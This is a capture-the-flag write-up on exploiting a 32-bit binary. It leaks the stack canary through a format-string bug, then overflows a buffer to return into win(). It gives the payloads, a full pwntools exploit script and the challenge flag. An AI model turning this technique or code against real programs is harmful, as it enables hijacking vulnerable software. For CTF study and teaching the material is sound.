# Writeup

## Overview
32-bit ELF. `challenge()` has two bugs:
1. `printf(words);` — a **format string** bug (our input is the format string).
2. `read(0, message, 256);` into `char message[64]` — a **stack buffer overflow**.

There's a `win()` that opens `parrots_memory.txt` and prints it (the flag). There's a stack canary though, so a plain overflow gets caught ("stack smashing detected"). The challenge name is the hint: "I'm a parrot, not a canary" → leak the canary with the format string, then overflow past it.

## Stage 1: leak the canary
The format string bug lets us read stack values with `%N$x`. The canary sits at positional index 39, so:

```
LEAK:%39$08x:END
```

Parse the hex between `LEAK:` and `:END` → that's the canary. (sanity check: a 32-bit canary's low byte is `0x00`.)

## Stage 2: ret2win
Now overflow `message[64]` with `read(0, message, 256)`, putting the real canary back in its place so the check passes, then overwrite the saved return address with `win()`:

```
payload = b"A"*128 + p32(canary) + b"B"*12 + p32(0x0804924e)   # win()
```

- canary offset: 128
- ret offset: 144 (so 12 bytes of filler between canary and ret)

```python
from pwn import *
context.arch = "i386"
io = remote(HOST, PORT)

io.sendlineafter(b"You: ", b"LEAK:%39$08x:END")
canary = int(re.search(rb"LEAK:([0-9a-f]{8}):END", io.recvuntil(b":END")).group(1), 16)

payload = b"A"*128 + p32(canary) + b"B"*12 + p32(0x0804924e)
io.sendafter(b"You: ", payload)
print(io.recvall().decode(errors="replace"))
```

`win()` runs and prints the parrot's memory (the flag).

## flag
```
flag{1m_4_p4rr07_n07_4_c4n4ry}
```
